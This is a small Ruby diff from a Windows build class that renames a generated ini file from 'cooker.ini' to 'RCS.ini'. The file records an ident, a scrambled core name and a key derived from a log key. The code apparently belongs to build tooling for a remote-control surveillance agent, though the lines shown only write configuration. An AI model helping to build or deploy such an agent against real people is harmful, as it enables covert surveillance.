@@ -127,7 +127,7 @@ class BuildWindows < Build
       key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
 
       # write the ini file
-      File.open(path('cooker.ini'), 'w') do |f|
+      File.open(path('RCS.ini'), 'w') do |f|
         f.puts "[RCS]"
         f.puts "HUID=#{@factory.ident}"
         f.puts "HCORE=#{@scrambled[:core]}"
